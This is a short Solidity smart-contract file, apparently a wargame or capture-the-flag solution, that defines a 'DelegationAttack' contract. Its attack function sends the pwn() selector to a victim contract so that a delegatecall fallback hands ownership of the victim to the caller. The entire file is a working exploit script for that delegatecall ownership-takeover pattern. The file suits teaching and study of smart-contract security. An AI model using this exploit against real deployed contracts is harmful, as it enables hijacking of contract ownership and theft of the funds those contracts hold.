// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract DelegationAttack {

    address public attacker;

    modifier onlyAttacker {
        require(msg.sender == attacker, "DelegationAttack: NOT_OWNER");
        _;
    }

    constructor() {
        attacker = msg.sender;
    }

    function attack(address _victim) public onlyAttacker {
        bytes4 sig = bytes4(keccak256(bytes("pwn()")));
        (bool success, ) = _victim.call(abi.encodeWithSelector(sig));
        require(success, "DelegationAttack: ATTACK_FAILED");
    }
}
